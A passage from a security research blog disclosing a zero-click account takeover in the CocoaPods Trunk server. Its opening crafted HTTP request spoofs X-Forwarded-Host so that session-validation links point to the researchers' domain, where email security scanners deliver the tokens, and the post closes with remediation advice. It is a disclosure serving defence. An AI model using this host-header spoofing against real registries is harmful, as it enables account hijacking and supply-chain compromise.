Content-Type: application/json; charset=utf-8
Accept: application/json; charset=utf-8
User-Agent: CocoaPods/1.12.1
Accept-Encoding: gzip, deflate
X-Forwarded-Host: research.evasec.io
Content-Length: 78

{
  "email":"research@evasec.io",
  "name":"EVAResearch",
  "description":null
}
</code></pre></div><p>The email generated by the CocoaPods âTrunkâ server will include a URL with the spoofed domain as specified above:</p><figure style="max-width:1202pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de236_6655ccfcbc997dc38489bf16_cocoaemail2.png" loading="lazy" alt=""/></div></figure><p>After receiving the session validation token, itâs possible to access the new link to validate the session and take over the account:</p><figure style="max-width:1544pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de24e_6655c75ab6a2e2e8a60744c3_10.png" loading="lazy" alt=""/></div></figure><figure style="max-width:1203pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de251_665483283dd887bf469b7bfc_12.png" loading="lazy" alt=""/></div></figure><p>You might be asking: <em>wait, this is a regular one-click attack, whereâs the zero-click?</em></p><p>To âupgradeâ the attack into a <strong>zero-click account takeover</strong> we needed the session validation link to be sent automatically from the userâs email inbox to our servers. How would we do that?</p><h4><strong>Email security products to the rescueÂ </strong></h4><p>Nowadays, almost every organization or even the email provider themselves is implementing email security products that are responsible for protecting the mailboxes of its employees from unwanted phishing links. The solutions can detect advanced and clever phishing attacks by just scanning the HTML content and comparing it against dozens of phishing templates they are already familiar with.</p><p>Can we use those capabilities to make the email solution scan the spoofed CocoaPods session validation link for a potential phishing attempt and by doing so we will get the token?</p><figure style="max-width:512pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de233_665484ae5b46d8319f7685d3_mrbean.jpeg" loading="lazy" alt=""/></div></figure><p>We have found that almost every Pod owner is registered with their organizational email on the Trunk server, which makes them vulnerable to our zero-click takeover vulnerability. For example, Amazon dev emails are registered under their organizationâs email system as can seen below:</p><figure style="max-width:1068pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de245_66546f313dd887bf4687f5be_HzExDoQBbjF2gS9CDWDPScXsFg95wGkWx5hQat0dpI2ltYvQy52je_4s1g58YFM0q9uR1tUejcBoba905CR_S7kMMWNLgqvOEVdG648rkV5TlSPspqFxDAzCbVMesF05GssYCzvNihSev46Xb8pDQrs.png" loading="lazy" alt=""/></div></figure><p>From this point, it was quite simple to take over almost every organizational pod account in the system, since their email security solutions are actively scanning every link sent to their inboxes.</p><p>In the screenshot below, we are demonstrating multiple session validation tokens that have been sent to us, meaning we have successfully taken over accounts in the system and we are now controlling them.Â </p><figure style="max-width:1188pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de24b_665483a2b57e7451b68cc99f_7.png" loading="lazy" alt=""/></div></figure><h3>The implications</h3><p>Compromising a victimâs account will result in a full takeover of the CocoaPods owned by the account. The threat actor could manipulate pod specifications, disrupt the distribution of legitimate libraries, or cause widespread disruption within the CocoaPods ecosystem.</p><p>Using this method, we managed to take over the owner accounts of some of the most popular CocoaPods packages. Potentially we could have used these accounts for highly damaging supply chain attacks that could impact the entire Apple ecosystem.</p><h2>Takeaways for Organizations</h2><p>The vulnerabilities discovered in CocoaPods serve as an important reminder of the risks associated with relying on open-source code and third-party dependencies.Â </p><p>Todayâs software supply chains are incredibly complex, and open-source libraries are deeply integrated into most applications via automated CI/CD pipelines; even when installed on developersâ local machines, malicious code can be used to reach other resources through lateral movements. There is no avoiding this in 2024, but it is important to remain aware of the potential consequences. Insight into the composition of your application code is paramount, as is ensuring the validity and reliability of any open-source dependencies.</p><p>Package managers serve an important role in making open-source software available. But they can also become central point of failures and hence require an added layer of vigilance. The CocoaPods team responded responsibly and swiftly to the vulnerabilities once disclosed. However, organizations must be aware of this potential attack surface, and stay informed of the various package and dependency management tools used by developers.</p><h2>Technical Remediation Steps</h2><p>While there is no direct evidence of any of these vulnerabilities being exploited in the wild, evidence of absence is not absence of evidence.Â </p><p>Potential code changes could affect millions of Apple devices around the world across iPhone, Mac, AppleTV, and AppleWatch devices. Hence, developers who have released applications for any of these platforms should take the following steps to secure their code:</p><ul role="list"><li>Keep your podfile.lock file synchronized with all CocoaPods developers to ensure everyone is on the same version of the packages. This will ensure that when a new, potentially harmful update is committed, developers will not automatically update to it.</li><li>If you are using a Pod which is developed internally and only hosted in CocoaPods for mass distribution, developers should perform CRC (checksum) validation against the one downloaded from the CocoaPods trunk server to ensure it&#x27;s the same as the one developed internally (where possible).</li><li>Implement a thorough security review of any third party code used in your applications.</li><li>Review CocoaPods dependencies and verify you are not using an orphaned Pod.</li><li>Ensure you use third party dependencies that are actively maintained and whose ownership is clear.</li><li>Perform periodic security code scans to detect secrets and malicious code on all external libraries, especially CocoaPods.Â </li><li>Be wary of very widely used dependencies as these could be a more attractive target for potential attackers to exploit. CocoaPods is only the beginningâ¦</li></ul></div></div><div id="w-node-_78650818-50dc-e917-bd4f-70d863abab1d-bbea2e48" class="hide"><a href="#" class="tocitem w-inline-block"><div class="tocdivider"></div><div>Link 1</div></a><a href="#" class="tocitem active w-inline-block"><div class="tocdivider"></div><div>Link 1</div></a><div class="w-embed"><style>
.tocitem.active .tocdivider {
    opacity: 1; /* Full opacity when .tocitem is active */
}
</style></div></div></div></div><div class="progress-track-wrap"><div data-w-id="09c519ef-e735-0849-7d76-01dd3e4ad19d" class="progress-track"></div><div class="progress-track-offset"></div></div></div><div class="section grey-bg"><div class="container-small"><div class="read-more-wrap"><h2 class="new-h2">CONTINUEÂ READING</h2><div class="blog-collection continue-reading w-dyn-list"><div fs-cmsfilter-element="list" role="list" class="blog-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/blog/argo-workflows-uncovering-the-hidden-misconfigurations" class="blog-link-wrap w-inline-block"><div class="blog-image-wrap"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b06d306e999d3cba53dec_final.jpg" loading="lazy" alt="" class="blog-image-thumbnail"/></div><div class="blog-tag">BlogPost</div><div class="blog-date">December 26, 2024</div><h2 fs-cmsfilter-field="name" class="blog-link-title">Argo Workflows - Uncovering the Hidden Misconfigurations</h2><p class="paragraph-intro">Misconfigured Argo Workflows may result in a massive supply chain attack</p><div class="blog-button-wrap"><div class="blog-link"><div class="text-block">Read More</div><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee2_link%20arrow.svg" loading="lazy" alt="" class="link-arrow"/></div></div></a></div></div></div></div></div></div><section class="footer-dark"><div class="footer-container"><div class="footer-wrapper"><div class="eva-logo footer"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ea5_Asset%202.png" loading="lazy" width="105" alt="" class="eva-logo in-footer"/></div><div class="footer-content"><div id="w-node-_43975abb-8308-87cb-968e-46516835dfee-2c3aa074" class="footer-block"><div class="title-small">Company</div><a href="/" class="footer-link">Home</a><a href="/services" class="footer-link">Services</a><a href="/blog" class="footer-link">Blog</a><a href="/about-us" class="footer-link">About us</a><a href="/contact-us" class="footer-link">Contact us</a></div><div id="w-node-_93426e23-104c-a2cd-acf5-11022c3aa07a-2c3aa074" class="footer-block"><div class="title-small">FOLLOW US</div><div class="social-media-list"><a href="https://twitter.com/eva_info_sec" target="_blank" class="social-link w-inline-block"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee7_x.svg" loading="lazy" alt="" class="social-icon invert"/></a><a href="https://www.linkedin.com/company/evainfosec/" target="_blank" class="social-link w-inline-block"><img src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee8_linkedin.svg" loading="lazy" alt="" class="social-icon"/></a></div></div><div id="w-node-_93426e23-104c-a2cd-acf5-11022c3aa087-2c3aa074" class="footer-block"><div class="title-small glow-footer">Ready to connect?</div><p class="paragraph-3">Whether you already have solutions in mind or want to explore options to achieve your offensive security goals, we&#x27;re ready to help.</p><a href="/contact-us" class="button-primary w-button">cONTACT US</a></div></div></div></div><div class="footer-divider"></div><div class="footer-copyright-center">Copyright Â© 2024 E.V.A</div><div class="footer-copyright-center"><a href="mailto:liordan4@gmail.com" class="credit-link">L.D Web Development</a></div></section><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6637ec84acdca762bbea2e39" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/js/webflow.c881aa20d3db8ff78bd175c0c72ed693.js" type="text/javascript"></script><script>
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    const id = entry.target.getAttribute("id");
    if (entry.isIntersecting) {
      document.querySelectorAll(".active").forEach((z) => {
        z.classList.remove("active")
      });
      document.querySelector(`a[href="#${id}"]`).classList.add("active");
    }
  });
}, { rootMargin: '0px 0px -75% 0px' });

let headings;
if(document.location.pathname.includes('cocoapods'))
	headings = document.getElementById("content").querySelectorAll("h2");
else
	headings = document.getElementById("content").querySelectorAll("h2, h3");
headings.forEach(function(heading, i) {
    observer.observe(heading); // Assuming observer is defined elsewhere

    let str = heading.innerHTML;
    str = str.replace(/\s+/g, '-').replace(/[Â°&\/\\#,+()$~%.'×³":;*?<>{}]/g, "").toLowerCase();
    heading.setAttribute("id", str);

    const item = document.createElement("a");
    let inner = heading.innerHTML.replace('&lt;u&gt;', '').replace('&lt;/u&gt;', '');
    item.innerHTML = inner;
    item.setAttribute("href", "#" + str);

    // Check if heading is h2 or h3 and add appropriate class
    if (heading.tagName.toLowerCase() === "h2") {
      item.classList.add("tocitem", "toc-h2");
    } else if (heading.tagName.toLowerCase() === "h3") {
      item.classList.add("tocitem", "toc-h3");
    }

    const divider = document.createElement("div");
    divider.setAttribute("class", "tocdivider");

    item.appendChild(divider);

    document.querySelector("#toc").appendChild(item);
});
</script>


<!-- Highlightjs -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.css">
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/http.min.js"></script>
<script>hljs.highlightAll();</script>
<style>
.hljs {
    font-size: 14px
}

code.hljs {
    border-radius: 1rem
}
</style>


<!-- medium-zoom.js -->
<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.3/dist/medium-zoom.min.js"></script>
<script>
setTimeout(() => {
const images = Array.from(document.querySelectorAll(".article-wrap img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0, /* The space outside the zoomed image */
    background: 'rgba(0, 0, 0, 0.6)', /* The background of the overlay */
    scrollOffset: 40, /* The number of pixels to scroll to close the zoom */
    container: null, /* The viewport to render the zoom in */
    template: null /* The template element to display on zoom */
  });
});
}, "2500");
</script>
<script src="https://tools.refokus.com/time-to-read/bundle.v1.0.0.js"></script>
</body></html>